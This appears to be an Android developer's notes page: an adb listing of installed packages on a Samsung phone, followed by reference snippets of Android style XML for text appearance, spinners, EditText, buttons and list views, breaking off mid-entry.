com.sec.android.app.twwallpaperchooser 10092 0 /data/data/com.sec.android.app.twwallpaperchooser
com.android.providers.media 10018 0 /data/data/com.android.providers.media
com.android.clipboardsaveservice 10012 0 /data/data/com.android.clipboardsaveservice
com.ijinshan.ShouJiKong.AndroidDaemon 10109 0 /data/data/com.ijinshan.ShouJiKong.AndroidDaemon
com.example.templategem 10121 1 /data/data/com.example.templategem
com.android.certinstaller 10011 0 /data/data/com.android.certinstaller
com.sec.android.app.snsimagecache 10082 0 /data/data/com.sec.android.app.snsimagecache
com.samsung.avrcp 10007 0 /data/data/com.samsung.avrcp
com.android.task 10086 0 /data/data/com.android.task
com.sec.spp.push 10064 0 /data/data/com.sec.spp.push
com.sec.android.widgetapp.socialhub 10001 0 /data/data/com.sec.android.widgetapp.socialhub
com.sec.android.app.memo 10036 0 /data/data/com.sec.android.app.memo
com.sec.android.widgetapp.sinaweatherclock 10080 0 /data/data/com.sec.android.widgetapp.sinaweatherclock
com.baidu.browser.apps 10114 0 /data/data/com.baidu.browser.apps
com.sec.android.service.cm 10010 0 /data/data/com.sec.android.service.cm
com.jiubang.goscreenlock.theme.funnyalpaca.ling 10125 0 /data/data/com.jiubang.goscreenlock.theme.funnyalpaca.ling
com.gau.go.launcherex.gowidget.gopowermaster 10127 0 /data/data/com.gau.go.launcherex.gowidget.gopowermaster
dopool.mango.video 10034 0 /data/data/dopool.mango.video
com.seven.Z7 10075 0 /data/data/com.seven.Z7
com.android.providers.drm 10018 0 /data/data/com.android.providers.drm
com.sec.readershub.global 10062 0 /data/data/com.sec.readershub.global
com.android.exchange 10020 0 /data/data/com.android.exchange
com.android.wallpaper.livepicker 10033 0 /data/data/com.android.wallpaper.livepicker
com.example.movetest 10118 1 /data/data/com.example.movetest
com.android.packageinstaller 10049 0 /data/data/com.android.packageinstaller
com.qiyi.video 10058 0 /data/data/com.qiyi.video
com.qzone 10059 0 /data/data/com.qzone
com.sec.pcw.device 10048 0 /data/data/com.sec.pcw.device
com.svox.pico 10052 0 /data/data/com.svox.pico
com.arcsoft.quickview 10061 0 /data/data/com.arcsoft.quickview
com.android.email 10019 0 /data/data/com.android.email
oms.mspaces 10104 0 /data/data/oms.mspaces
com.kobobooks.samsung.android 10031 0 /data/data/com.kobobooks.samsung.android
com.baidu.BaiduMap 10128 0 /data/data/com.baidu.BaiduMap
com.android.backupconfirm 10004 0 /data/data/com.android.backupconfirm
com.sec.android.mimage.photoretouching 10051 0 /data/data/com.sec.android.mimage.photoretouching
com.sec.android.widgetapp.programmonitorwidget 10068 0 /data/data/com.sec.android.widgetapp.programmonitorwidget
com.sec.android.app.mobileprint 10041 0 /data/data/com.sec.android.app.mobileprint
com.uc.browser 10093 0 /data/data/com.uc.browser
com.android.providers.downloads 10018 0 /data/data/com.android.providers.downloads
com.android.musicfx 10042 0 /data/data/com.android.musicfx
com.smlds 10085 0 /data/data/com.smlds
com.tencent.WBlog 10088 0 /data/data/com.tencent.WBlog
com.tencent.mtt 10057 0 /data/data/com.tencent.mtt
com.sec.android.app.calculator 10090 0 /data/data/com.sec.android.app.calculator
com.lifevibes.trimapp 10091 0 /data/data/com.lifevibes.trimapp
com.tencent.qq 10002 0 /data/data/com.tencent.qq
com.youku.phone 10098 0 /data/data/com.youku.phone
com.sec.android.app.sns 10083 0 /data/data/com.sec.android.app.sns
com.gau.go.launcherex.gowidget.taskmanagerex 10130 0 /data/data/com.gau.go.launcherex.gowidget.taskmanagerex
com.sec.android.app.popupuireceiver 10054 0 /data/data/com.sec.android.app.popupuireceiver
com.sec.ccl.csp.app.secretwallpaper.themeone 10072 0 /data/data/com.sec.ccl.csp.app.secretwallpaper.themeone
com.sec.android.widgetapp.dualclock 10001 0 /data/data/com.sec.android.widgetapp.dualclock
com.sec.android.app.snsaccountqz 10081 0 /data/data/com.sec.android.app.snsaccountqz
com.sec.android.app.camera 10009 0 /data/data/com.sec.android.app.camera
com.infraware.polarisoffice 10053 0 /data/data/com.infraware.polarisoffice
com.sec.android.app.twlauncher 10001 0 /data/data/com.sec.android.app.twlauncher
com.sec.android.app.fm 10025 0 /data/data/com.sec.android.app.fm
com.samsung.swift.app.kiesair 10030 0 /data/data/com.samsung.swift.app.kiesair
com.sec.android.provider.logsprovider 10003 0 /data/data/com.sec.android.provider.logsprovider
com.hexin.app.android 10089 0 /data/data/com.hexin.app.android
com.cooliris.media 10027 0 /data/data/com.cooliris.media
com.sec.android.app.myfiles 10044 0 /data/data/com.sec.android.app.myfiles
com.sec.android.app.snsdisclaimer 10081 0 /data/data/com.sec.android.app.snsdisclaimer
com.android.providers.userdictionary 10003 0 /data/data/com.android.providers.userdictionary
com.gau.go.launcherex.gowidget.gobackup 10123 1 /data/data/com.gau.go.launcherex.gowidget.gobackup
com.sina.mfweibo 10107 0 /data/data/com.sina.mfweibo
com.sec.android.widgetapp.digitalclock 10015 0 /data/data/com.sec.android.widgetapp.digitalclock
com.chaozh.iReaderFree15 10101 0 /data/data/com.chaozh.iReaderFree15
com.sec.android.app.FileTransferManager 10022 0 /data/data/com.sec.android.app.FileTransferManager
com.cleanmaster.mguard 10111 0 /data/data/com.cleanmaster.mguard
com.autonavi.xmgd.navigator 10045 0 /data/data/com.autonavi.xmgd.navigator
com.sec.android.widgetapp.analogclock 10001 0 /data/data/com.sec.android.widgetapp.analogclock
com.sec.android.app.controlpanel 10029 0 /data/data/com.sec.android.app.controlpanel
com.netease.newsreader.activity 10117 0 /data/data/com.netease.newsreader.activity
com.sec.android.app.FileTransferServer 10023 0 /data/data/com.sec.android.app.FileTransferServer
com.sec.android.app.mediashub 10035 0 /data/data/com.sec.android.app.mediashub
com.sec.android.app.minidiary 10038 0 /data/data/com.sec.android.app.minidiary
com.sec.android.app.samsungapps 10065 0 /data/data/com.sec.android.app.samsungapps
cn.motech.Dictionary 10100 0 /data/data/cn.motech.Dictionary
com.android.providers.contacts 10003 0 /data/data/com.android.providers.contacts
com.sec.android.app.snsaccountkx 10081 0 /data/data/com.sec.android.app.snsaccountkx
com.gau.go.launcherex.theme.Womensday.dante 10126 0 /data/data/com.gau.go.launcherex.theme.Womensday.dante
com.android.providers.applications 10003 0 /data/data/com.android.providers.applications
org.whitree.template 10131 1 /data/data/org.whitree.template
com.newspaperdirect.pressreader.android.samsung 10055 0 /data/data/com.newspaperdirect.pressreader.android.samsung
com.android.providers.tasks 10087 0 /data/data/com.android.providers.tasks
com.sec.android.im 10066 0 /data/data/com.sec.android.im
com.kaixin001.activity 10102 0 /data/data/com.kaixin001.activity
com.sec.android.app.clockpackage 10013 0 /data/data/com.sec.android.app.clockpackage
com.mappn.gfan 10132 1 /data/data/com.mappn.gfan
com.sec.android.providers.downloads 10018 0 /data/data/com.sec.android.providers.downloads
com.sec.android.widgetapp.days 10001 0 /data/data/com.sec.android.widgetapp.days
com.sec.android.app.videoplayer 10094 0 /data/data/com.sec.android.app.videoplayer
com.sec.android.drmpopup 10047 0 /data/data/com.sec.android.drmpopup
com.cleanmaster.mguard.filemanager 10133 1 /data/data/com.cleanmaster.mguard.filemanager
com.android.smspush 10096 0 /data/data/com.android.smspush
com.etagmedia.ar 10097 0 /data/data/com.etagmedia.ar
com.sec.android.app.dlna 10017 0 /data/data/com.sec.android.app.dlna
com.renren.mobile.android 10063 0 /data/data/com.renren.mobile.android
com.sec.android.widgetapp.TwCalendarAppWidget 10001 0 /data/data/com.sec.android.widgetapp.TwCalendarAppWidget
com.android.wallpaper 10032 0 /data/data/com.android.wallpaper
com.sec.android.app.snsaccountrr 10081 0 /data/data/com.sec.android.app.snsaccountrr
viva.reader 10108 0 /data/data/viva.reader
com.noshufou.android.su 10110 1 /data/data/com.noshufou.android.su
com.example.testandroidjin 10129 1 /data/data/com.example.testandroidjin
com.wsomacp 10046 0 /data/data/com.wsomacp
com.hiapk.marketpho 10112 0 /data/data/com.hiapk.marketpho
com.sec.android.app.MainLabel 10074 0 /data/data/com.sec.android.app.MainLabel
com.sec.android.app.music 10043 0 /data/data/com.sec.android.app.music
com.sec.android.app.minimode.res 10103 0 /data/data/com.sec.android.app.minimode.res
com.android.facelock 10024 0 /data/data/com.android.facelock
com.sec.android.widgetapp.buddiesnow 10001 0 /data/data/com.sec.android.widgetapp.buddiesnow
com.samsung.map 10008 0 /data/data/com.samsung.map
com.sec.android.widgetapp.sinanews 10078 0 /data/data/com.sec.android.widgetapp.sinanews
com.sec.android.app.voicerecorder 10095 0 /data/data/com.sec.android.app.voicerecorder
$ adb shell cat '/data/system/packages.list'                                                                                                                         ~
com.android.defcontainer 10014 0 /data/data/com.android.defcontainer
com.sec.phone 10071 0 /data/data/com.sec.phone
com.android.quicksearchbox 10060 0 /data/data/com.android.quicksearchbox
com.zinio.samsung.android 10099 0 /data/data/com.zinio.samsung.android
com.android.contacts 10003 0 /data/data/com.android.contacts
com.sec.android.app.MmsProvision 10040 0 /data/data/com.sec.android.app.MmsProvision
com.sec.android.app.shareapp 10076 0 /data/data/com.sec.android.app.shareapp
com.jlradio.fm 10122 1 /data/data/com.jlradio.fm
com.sec.android.fotaclient 10026 0 /data/data/com.sec.android.fotaclient
com.sec.android.motions.settings.panningtutorial 10050 0 /data/data/com.sec.android.motions.settings.panningtutorial
com.sec.android.samsungappswidget 10105 0 /data/data/com.sec.android.samsungappswidget
com.android.htmlviewer 10028 0 /data/data/com.android.htmlviewer
com.gameloft.android.GAND.GloftAsphalt5.asphalt5 10115 0 /data/data/com.gameloft.android.GAND.GloftAsphalt5.asphalt5
com.android.providers.calendar 10070 0 /data/data/com.android.providers.calendar
com.android.bluetooth 10006 0 /data/data/com.android.bluetooth
com.sec.android.widgetapp.postit 10001 0 /data/data/com.sec.android.widgetapp.postit
com.samsung.android.livewallpaper.microbesgl 10037 0 /data/data/com.samsung.android.livewallpaper.microbesgl
com.android.calendar 10070 0 /data/data/com.android.calendar
com.samsung.android.app.divx 10016 0 /data/data/com.samsung.android.app.divx
com.android.browser 10069 0 /data/data/com.android.browser
com.sec.android.provider.badge 10005 0 /data/data/com.sec.android.provider.badge
com.sec.android.socialhub 10084 0 /data/data/com.sec.android.socialhub
go.launcher.theme.KissMe 10124 0 /data/data/go.launcher.theme.KissMe
com.android.providers.downloads.ui 10018 0 /data/data/com.android.providers.downloads.ui
com.samsung.SMT 10067 0 /data/data/com.samsung.SMT
com.sec.ccl.csp.app.secretwallpaper.themetwo 10073 0 /data/data/com.sec.ccl.csp.app.secretwallpaper.themetwo
com.sec.android.app.shutdown 10106 0 /data/data/com.sec.android.app.shutdown
com.android.sharedstoragebackup 10077 0 /data/data/com.android.sharedstoragebackup
com.sec.android.app.FileTransferClient 10021 0 /data/data/com.sec.android.app.FileTransferClient
com.sec.android.widgetapp.stockclock.sina 10079 0 /data/data/com.sec.android.widgetapp.stockclock.sina
com.android.mms 10039 0 /data/data/com.android.mms
com.android.provision 10056 0 /data/data/com.android.provision
com.sec.android.app.twwallpaperchooser 10092 0 /data/data/com.sec.android.app.twwallpaperchooser
com.android.providers.media 10018 0 /data/data/com.android.providers.media
com.android.clipboardsaveservice 10012 0 /data/data/com.android.clipboardsaveservice
com.ijinshan.ShouJiKong.AndroidDaemon 10109 0 /data/data/com.ijinshan.ShouJiKong.AndroidDaemon
com.example.templategem 10121 1 /data/data/com.example.templategem
com.android.certinstaller 10011 0 /data/data/com.android.certinstaller
com.sec.android.app.snsimagecache 10082 0 /data/data/com.sec.android.app.snsimagecache
com.samsung.avrcp 10007 0 /data/data/com.samsung.avrcp
com.android.task 10086 0 /data/data/com.android.task
com.sec.spp.push 10064 0 /data/data/com.sec.spp.push
com.sec.android.widgetapp.socialhub 10001 0 /data/data/com.sec.android.widgetapp.socialhub
com.sec.android.app.memo 10036 0 /data/data/com.sec.android.app.memo
com.sec.android.widgetapp.sinaweatherclock 10080 0 /data/data/com.sec.android.widgetapp.sinaweatherclock
com.baidu.browser.apps 10114 0 /data/data/com.baidu.browser.apps
com.sec.android.service.cm 10010 0 /data/data/com.sec.android.service.cm
com.jiubang.goscreenlock.theme.funnyalpaca.ling 10125 0 /data/data/com.jiubang.goscreenlock.theme.funnyalpaca.ling
com.gau.go.launcherex.gowidget.gopowermaster 10127 0 /data/data/com.gau.go.launcherex.gowidget.gopowermaster
dopool.mango.video 10034 0 /data/data/dopool.mango.video
com.seven.Z7 10075 0 /data/data/com.seven.Z7
com.android.providers.drm 10018 0 /data/data/com.android.providers.drm
com.sec.readershub.global 10062 0 /data/data/com.sec.readershub.global
com.android.exchange 10020 0 /data/data/com.android.exchange
com.android.wallpaper.livepicker 10033 0 /data/data/com.android.wallpaper.livepicker
com.example.movetest 10118 1 /data/data/com.example.movetest
com.android.packageinstaller 10049 0 /data/data/com.android.packageinstaller
com.qiyi.video 10058 0 /data/data/com.qiyi.video
com.qzone 10059 0 /data/data/com.qzone
com.sec.pcw.device 10048 0 /data/data/com.sec.pcw.device
com.svox.pico 10052 0 /data/data/com.svox.pico
com.arcsoft.quickview 10061 0 /data/data/com.arcsoft.quickview
com.android.email 10019 0 /data/data/com.android.email
oms.mspaces 10104 0 /data/data/oms.mspaces
com.kobobooks.samsung.android 10031 0 /data/data/com.kobobooks.samsung.android
com.baidu.BaiduMap 10128 0 /data/data/com.baidu.BaiduMap
com.android.backupconfirm 10004 0 /data/data/com.android.backupconfirm
com.sec.android.mimage.photoretouching 10051 0 /data/data/com.sec.android.mimage.photoretouching
com.sec.android.widgetapp.programmonitorwidget 10068 0 /data/data/com.sec.android.widgetapp.programmonitorwidget
com.sec.android.app.mobileprint 10041 0 /data/data/com.sec.android.app.mobileprint
com.uc.browser 10093 0 /data/data/com.uc.browser
com.android.providers.downloads 10018 0 /data/data/com.android.providers.downloads
com.android.musicfx 10042 0 /data/data/com.android.musicfx
com.smlds 10085 0 /data/data/com.smlds
com.tencent.WBlog 10088 0 /data/data/com.tencent.WBlog
com.tencent.mtt 10057 0 /data/data/com.tencent.mtt
com.sec.android.app.calculator 10090 0 /data/data/com.sec.android.app.calculator
com.lifevibes.trimapp 10091 0 /data/data/com.lifevibes.trimapp
com.tencent.qq 10002 0 /data/data/com.tencent.qq
com.youku.phone 10098 0 /data/data/com.youku.phone
com.sec.android.app.sns 10083 0 /data/data/com.sec.android.app.sns
com.gau.go.launcherex.gowidget.taskmanagerex 10130 0 /data/data/com.gau.go.launcherex.gowidget.taskmanagerex
com.sec.android.app.popupuireceiver 10054 0 /data/data/com.sec.android.app.popupuireceiver
com.sec.ccl.csp.app.secretwallpaper.themeone 10072 0 /data/data/com.sec.ccl.csp.app.secretwallpaper.themeone
com.sec.android.widgetapp.dualclock 10001 0 /data/data/com.sec.android.widgetapp.dualclock
com.sec.android.app.snsaccountqz 10081 0 /data/data/com.sec.android.app.snsaccountqz
com.sec.android.app.camera 10009 0 /data/data/com.sec.android.app.camera
com.infraware.polarisoffice 10053 0 /data/data/com.infraware.polarisoffice
com.sec.android.app.twlauncher 10001 0 /data/data/com.sec.android.app.twlauncher
com.sec.android.app.fm 10025 0 /data/data/com.sec.android.app.fm
com.samsung.swift.app.kiesair 10030 0 /data/data/com.samsung.swift.app.kiesair
com.sec.android.provider.logsprovider 10003 0 /data/data/com.sec.android.provider.logsprovider
com.hexin.app.android 10089 0 /data/data/com.hexin.app.android
com.cooliris.media 10027 0 /data/data/com.cooliris.media
com.sec.android.app.myfiles 10044 0 /data/data/com.sec.android.app.myfiles
com.sec.android.app.snsdisclaimer 10081 0 /data/data/com.sec.android.app.snsdisclaimer
com.android.providers.userdictionary 10003 0 /data/data/com.android.providers.userdictionary
com.gau.go.launcherex.gowidget.gobackup 10123 1 /data/data/com.gau.go.launcherex.gowidget.gobackup
com.sina.mfweibo 10107 0 /data/data/com.sina.mfweibo
com.sec.android.widgetapp.digitalclock 10015 0 /data/data/com.sec.android.widgetapp.digitalclock
com.chaozh.iReaderFree15 10101 0 /data/data/com.chaozh.iReaderFree15
com.sec.android.app.FileTransferManager 10022 0 /data/data/com.sec.android.app.FileTransferManager
com.cleanmaster.mguard 10111 0 /data/data/com.cleanmaster.mguard
com.autonavi.xmgd.navigator 10045 0 /data/data/com.autonavi.xmgd.navigator
com.sec.android.widgetapp.analogclock 10001 0 /data/data/com.sec.android.widgetapp.analogclock
com.sec.android.app.controlpanel 10029 0 /data/data/com.sec.android.app.controlpanel
com.netease.newsreader.activity 10117 0 /data/data/com.netease.newsreader.activity
com.sec.android.app.FileTransferServer 10023 0 /data/data/com.sec.android.app.FileTransferServer
com.sec.android.app.mediashub 10035 0 /data/data/com.sec.android.app.mediashub
com.sec.android.app.minidiary 10038 0 /data/data/com.sec.android.app.minidiary
com.sec.android.app.samsungapps 10065 0 /data/data/com.sec.android.app.samsungapps
cn.motech.Dictionary 10100 0 /data/data/cn.motech.Dictionary
com.android.providers.contacts 10003 0 /data/data/com.android.providers.contacts
com.sec.android.app.snsaccountkx 10081 0 /data/data/com.sec.android.app.snsaccountkx
com.gau.go.launcherex.theme.Womensday.dante 10126 0 /data/data/com.gau.go.launcherex.theme.Womensday.dante
com.android.providers.applications 10003 0 /data/data/com.android.providers.applications
org.whitree.template 10131 1 /data/data/org.whitree.template
com.newspaperdirect.pressreader.android.samsung 10055 0 /data/data/com.newspaperdirect.pressreader.android.samsung
com.android.providers.tasks 10087 0 /data/data/com.android.providers.tasks
com.sec.android.im 10066 0 /data/data/com.sec.android.im
com.kaixin001.activity 10102 0 /data/data/com.kaixin001.activity
com.sec.android.app.clockpackage 10013 0 /data/data/com.sec.android.app.clockpackage
com.mappn.gfan 10132 1 /data/data/com.mappn.gfan
com.sec.android.providers.downloads 10018 0 /data/data/com.sec.android.providers.downloads
com.sec.android.widgetapp.days 10001 0 /data/data/com.sec.android.widgetapp.days
com.sec.android.app.videoplayer 10094 0 /data/data/com.sec.android.app.videoplayer
com.sec.android.drmpopup 10047 0 /data/data/com.sec.android.drmpopup
com.cleanmaster.mguard.filemanager 10133 1 /data/data/com.cleanmaster.mguard.filemanager
com.android.smspush 10096 0 /data/data/com.android.smspush
com.etagmedia.ar 10097 0 /data/data/com.etagmedia.ar
com.sec.android.app.dlna 10017 0 /data/data/com.sec.android.app.dlna
com.renren.mobile.android 10063 0 /data/data/com.renren.mobile.android
com.sec.android.widgetapp.TwCalendarAppWidget 10001 0 /data/data/com.sec.android.widgetapp.TwCalendarAppWidget
com.android.wallpaper 10032 0 /data/data/com.android.wallpaper
com.sec.android.app.snsaccountrr 10081 0 /data/data/com.sec.android.app.snsaccountrr
viva.reader 10108 0 /data/data/viva.reader
com.noshufou.android.su 10110 1 /data/data/com.noshufou.android.su
com.example.testandroidjin 10129 1 /data/data/com.example.testandroidjin
com.wsomacp 10046 0 /data/data/com.wsomacp
com.hiapk.marketpho 10112 0 /data/data/com.hiapk.marketpho
com.sec.android.app.MainLabel 10074 0 /data/data/com.sec.android.app.MainLabel
com.sec.android.app.music 10043 0 /data/data/com.sec.android.app.music
com.sec.android.app.minimode.res 10103 0 /data/data/com.sec.android.app.minimode.res
com.android.facelock 10024 0 /data/data/com.android.facelock
com.sec.android.widgetapp.buddiesnow 10001 0 /data/data/com.sec.android.widgetapp.buddiesnow
com.samsung.map 10008 0 /data/data/com.samsung.map
com.sec.android.widgetapp.sinanews 10078 0 /data/data/com.sec.android.widgetapp.sinanews
com.sec.android.app.voicerecorder 10095 0 /data/data/com.sec.android.app.voicerecorder
```
[[TOC]]
# Window
```
    <style name="WindowTitleBackground">
        <item name="android:background">@android:drawable/title_bar</item>
    </style>
    <style name="WindowTitle">
        <item name="android:singleLine">true</item>
        <item name="android:textAppearance">@style/TextAppearance.WindowTitle</item>
        <item name="android:shadowColor">#BB000000</item>
        <item name="android:shadowRadius">2.75</item>
    </style>
```
# 字体
 * 大字: android:textAppearance="?android:attr/textAppearanceLarge"
 * 小字: android:textAppearance="?android:attr/textAppearanceSmall"
 * 中字: android:textAppearance="?android:attr/textAppearanceMedium"
```
   <style name="TextAppearance">
        <item name="android:textColor">?textColorPrimary</item>
        <item name="android:textColorHighlight">?textColorHighlight</item>
        <item name="android:textColorHint">?textColorHint</item>
        <item name="android:textColorLink">?textColorLink</item>
        <item name="android:textSize">16sp</item>
        <item name="android:textStyle">normal</item>
    </style>
    <style name="TextAppearance.Inverse">
        <item name="textColor">?textColorPrimaryInverse</item>
        <item name="android:textColorHint">?textColorHintInverse</item>
        <item name="android:textColorHighlight">?textColorHighlightInverse</item>
        <item name="android:textColorLink">?textColorLinkInverse</item>
    </style>
 <style name="TextAppearance.Theme">
    </style>
    <style name="TextAppearance.DialogWindowTitle">
        <item name="android:textSize">18sp</item>
    </style>
    <style name="TextAppearance.Large">
        <item name="android:textSize">22sp</item>
    </style>
    <style name="TextAppearance.Large.Inverse">
        <item name="android:textColor">?textColorPrimaryInverse</item>
        <item name="android:textColorHint">?textColorHintInverse</item>
        <item name="android:textColorHighlight">?textColorHighlightInverse</item>
        <item name="android:textColorLink">?textColorLinkInverse</item>
    </style>
    <style name="TextAppearance.Medium">
        <item name="android:textSize">18sp</item>
    </style>
    <style name="TextAppearance.Medium.Inverse">
        <item name="android:textColor">?textColorPrimaryInverse</item>
        <item name="android:textColorHint">?textColorHintInverse</item>
        <item name="android:textColorHighlight">?textColorHighlightInverse</item>
        <item name="android:textColorLink">?textColorLinkInverse</item>
    </style>
    <style name="TextAppearance.Small">
        <item name="android:textSize">14sp</item>
        <item name="android:textColor">?textColorSecondary</item>
    </style>
    <style name="TextAppearance.Small.Inverse">
        <item name="android:textColor">?textColorSecondaryInverse</item>
        <item name="android:textColorHint">?textColorHintInverse</item>
        <item name="android:textColorHighlight">?textColorHighlightInverse</item>
        <item name="android:textColorLink">?textColorLinkInverse</item>
    </style>
    <style name="TextAppearance.Theme.Dialog" parent="TextAppearance.Theme">
    </style>
    <style name="TextAppearance.Theme.Dialog.AppError">
        <item name="android:textColor">#ffffc0c0</item>
    </style>
    <style name="TextAppearance.Widget">
    </style>
    <style name="TextAppearance.Widget.Button" parent="TextAppearance.Small.Inverse">
        <item name="android:textColor">@android:color/primary_text_light_nodisable</item>
    </style>
    <style name="TextAppearance.Widget.IconMenu.Item" parent="TextAppearance.Small">
        <item name="android:textColor">?textColorPrimary</item>
    </style>
    <style name="TextAppearance.Widget.EditText">
        <item name="android:textColor">@color/widget_edittext_dark</item>
        <item name="android:textColorHint">@android:color/hint_foreground_light</item>
    </style>
    <style name="TextAppearance.Widget.TabWidget">
        <item name="android:textSize">14sp</item>
        <item name="android:textStyle">normal</item>
        <item name="android:textColor">@android:color/tab_indicator_text</item>
    </style>
    
    <style name="TextAppearance.Widget.TextView">
        <item name="android:textColor">?textColorPrimaryDisableOnly</item>
        <item name="android:textColorHint">?textColorHint</item>
    </style>
    <style name="TextAppearance.Widget.TextView.PopupMenu">
        <item name="android:textSize">18sp</item>
        <item name="android:textColor">?textColorPrimaryDisableOnly</item>
        <item name="android:textColorHint">?textColorHint</item>
    </style>
    <style name="TextAppearance.Widget.DropDownHint">
        <item name="android:textColor">?textColorPrimaryInverse</item>
        <item name="android:textSize">14sp</item>
    </style>
    <style name="TextAppearance.Widget.DropDownItem">
        <item name="android:textColor">@android:color/primary_text_light_disable_only</item>
    </style>
    <style name="TextAppearance.Widget.TextView.SpinnerItem">
        <item name="android:textColor">@android:color/primary_text_light_disable_only</item>
    </style>
    <!-- @hide -->
    <style name="TextAppearance.SlidingTabNormal" 
        parent="@android:attr/textAppearanceMedium">
        <item name="android:textColor">?android:attr/textColorTertiary</item>
        <item name="android:textSize">28sp</item>
        <item name="android:shadowColor">@android:color/sliding_tab_text_color_shadow</item>
        <item name="android:shadowDx">0.0</item>
        <item name="android:shadowDy">1.0</item>
        <item name="android:shadowRadius">5.0</item>
    </style>
    <!-- @hide -->
    <style name="TextAppearance.SlidingTabActive" 
        parent="@android:attr/textAppearanceMedium">
        <item name="android:textColor">@android:color/sliding_tab_text_color_active</item>
        <item name="android:textSize">28sp</item>
    </style>
    <!-- @hide -->
     <style name="TextAppearance.SearchResult">
         <item name="android:textStyle">normal</item>
         <item name="android:textColor">?textColorPrimaryInverse</item>
         <item name="android:textColorHint">?textColorHintInverse</item>
     </style>	
     <!-- @hide -->
     <style name="TextAppearance.SearchResult.Title">
         <item name="android:textSize">18sp</item>
     </style>
     <!-- @hide -->
     <style name="TextAppearance.SearchResult.Subtitle">
         <item name="android:textSize">14sp</item>
         <item name="android:textColor">?textColorSecondaryInverse</item>
     </style>
    <style name="TextAppearance.WindowTitle">
        <item name="android:textColor">#fff</item>
        <item name="android:textSize">14sp</item>
        <item name="android:textStyle">bold</item>
    </style>
    <style name="TextAppearance.Large.Inverse.NumberPickerInputText">
        <item name="android:textColor">@android:color/primary_text_light</item>
        <item name="android:textSize">30sp</item>
    </style>
    <style name="Widget.ActivityChooserView">
        <item name="android:gravity">center</item>
        <item name="android:background">@android:drawable/ab_share_pack_holo_dark</item>
        <item name="android:divider">?android:attr/dividerVertical</item>
        <item name="android:showDividers">middle</item>
        <item name="android:dividerPadding">6dip</item>
    </style>
     <style name="TextAppearance.SuggestionHighlight">
         <item name="android:textSize">18sp</item>
         <item name="android:textColor">@android:color/suggestion_highlight_text</item>
     </style>
```
# Themes
# PopupMenu
```
    <style name="Widget.TextView.PopupMenu">
        <item name="android:clickable">true</item>
        <item name="android:textAppearance">@style/TextAppearance.Widget.TextView.PopupMenu</item>
    </style>
```
# Spinner
``` 
    <style name="Widget.Spinner">
        <item name="android:background">@android:drawable/btn_dropdown</item>
        <item name="android:clickable">true</item>
        <item name="android:spinnerMode">dialog</item>
        <item name="android:dropDownSelector">@android:drawable/list_selector_background</item>
        <item name="android:popupBackground">@android:drawable/spinner_dropdown_background</item>
        <item name="android:dropDownVerticalOffset">-10dip</item>
        <item name="android:dropDownHorizontalOffset">0dip</item>
        <item name="android:dropDownWidth">wrap_content</item>
        <item name="android:popupPromptView">@android:layout/simple_dropdown_hint</item>
        <item name="android:gravity">center</item>
    </style>
    <style name="Widget.Spinner.DropDown">
        <item name="android:spinnerMode">dropdown</item>
    </style>
    <style name="Widget.TextView.SpinnerItem">
        <item name="android:textAppearance">@style/TextAppearance.Widget.TextView.SpinnerItem</item>
    </style>
    <style name="Widget.DropDownItem.Spinner">
        <item name="android:checkMark">?android:attr/listChoiceIndicatorSingle</item>
    </style>
```
# EditText
```
    <style name="Widget.EditText">
        <item name="android:focusable">true</item>
        <item name="android:focusableInTouchMode">true</item>
        <item name="android:clickable">true</item>
        <item name="android:background">?android:attr/editTextBackground</item>
        <item name="android:textAppearance">?android:attr/textAppearanceMediumInverse</item>
        <item name="android:textColor">?android:attr/editTextColor</item>
        <item name="android:gravity">center_vertical</item>
    </style>
    <style name="Widget.AutoCompleteTextView" parent="Widget.EditText">
        <item name="android:completionHintView">@android:layout/simple_dropdown_hint</item>
        <item name="android:completionThreshold">2</item>
        <item name="android:dropDownSelector">@android:drawable/list_selector_background</item>
        <item name="android:popupBackground">@android:drawable/spinner_dropdown_background</item>
        <item name="android:dropDownVerticalOffset">-6dip</item>
        <item name="android:dropDownHorizontalOffset">0dip</item>
        <item name="android:dropDownWidth">wrap_content</item>
    </style>
```
# Button
```
    <style name="Theme.X" parent="">
        ...
        <item name="android:disabledAlpha">0.5</item>
        <item name="android:buttonStyle">@style/ButtonStyle</item>
    </style>
    <style name="ButtonStyle" parent="">
        <item name="android:background">@drawable/ice</item>
        <item name="android:textAppearance">@android:style/TextAppearance.Large</item>
        <item name="android:textColor">#FFF</item>
        <item name="android:minHeight">48dip</item>
        <item name="android:minWidth">64dip</item>
    </style>
```
# TextView
```
    <style name="Theme.X" parent="">
        ...
        <item name="android:textAppearanceLarge">@android:style/TextAppearance.Large</item>
        <item name="android:textAppearanceMedium">@android:style/TextAppearance.Medium</item>
        <item name="android:textAppearanceSmall">@android:style/TextAppearance.Small</item>
        <item name="android:textColorPrimary">#F0F</item>
        <item name="android:textColorSecondary">@android:color/secondary_text_dark</item>
        <item name="android:textColorTertiary">@android:color/tertiary_text_dark</item>
        ...
    </style>
        <style name="Widget.TextView">
        <item name="android:textAppearance">?android:attr/textAppearanceSmall</item>
        <item name="android:textSelectHandleLeft">?android:attr/textSelectHandleLeft</item>
        <item name="android:textSelectHandleRight">?android:attr/textSelectHandleRight</item>
        <item name="android:textSelectHandle">?android:attr/textSelectHandle</item>
        <item name="android:textEditPasteWindowLayout">?android:attr/textEditPasteWindowLayout</item>
        <item name="android:textEditNoPasteWindowLayout">?android:attr/textEditNoPasteWindowLayout</item>
        <item name="android:textEditSidePasteWindowLayout">?android:attr/textEditSidePasteWindowLayout</item>
        <item name="android:textEditSideNoPasteWindowLayout">?android:attr/textEditSideNoPasteWindowLayout</item>
        <item name="android:textEditSuggestionItemLayout">?android:attr/textEditSuggestionItemLayout</item>
        <item name="android:textCursorDrawable">?android:attr/textCursorDrawable</item>
    </style>
    
    <style name="Widget.TextView.ListSeparator">
        <item name="android:background">@android:drawable/dark_header_dither</item>
        <item name="android:layout_width">match_parent</item>
        <item name="android:layout_height">wrap_content</item>
        <item name="android:textStyle">bold</item>
        <item name="android:textColor">?textColorSecondary</item>
        <item name="android:textSize">14sp</item>
        <item name="android:gravity">center_vertical</item>
        <item name="android:paddingLeft">8dip</item>
    </style>
    <style name="Widget.TextView.ListSeparator.White">
        <item name="android:textColor">?textColorPrimaryInverse</item>
        <item name="android:background">@android:drawable/light_header_dither</item>
    </style>
```
# ListView
```
    <style name="Widget.ListView" parent="Widget.AbsListView">
        <item name="android:listSelector">@android:drawable/list_selector_background</item>
        <item name="android:cacheColorHint">?android:attr/colorBackgroundCacheHint</item>
        <item name="android:divider">@android:drawable/divider_horizontal_dark_opaque</item>
    </style>
    <style name="Widget.ExpandableListView" parent="Widget.ListView">
